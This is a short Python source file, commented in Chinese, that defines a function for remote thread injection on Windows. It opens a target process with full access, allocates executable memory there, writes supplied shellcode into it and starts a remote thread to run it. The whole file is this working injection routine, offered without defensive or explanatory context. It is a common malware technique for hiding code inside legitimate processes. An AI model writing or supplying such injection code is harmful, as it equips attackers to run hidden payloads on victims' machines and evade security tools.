import ctypes

def remote_thread_injection(target_process_id, shellcode):
    kernel32 = ctypes.WinDLL('kernel32')

    # 開啟目標進程
    process_handle = kernel32.OpenProcess(0x1F0FFF, False, target_process_id)
    
    # 在目標進程空間中配置一塊記憶體區域，用來儲存shellcode
    shellcode_address = kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), 0x1000, 0x40)
    
    # 在目標進程中寫入shellcode
    kernel32.WriteProcessMemory(process_handle, shellcode_address, shellcode, len(shellcode), 0)
    
    # 在目標進程中創建遠程執行緒，並將執行位址設為shellcode
    thread_id = ctypes.c_ulong()
    kernel32.CreateRemoteThread(process_handle, None, 0, shellcode_address, None, 0, ctypes.byref(thread_id))
    
    kernel32.CloseHandle(process_handle)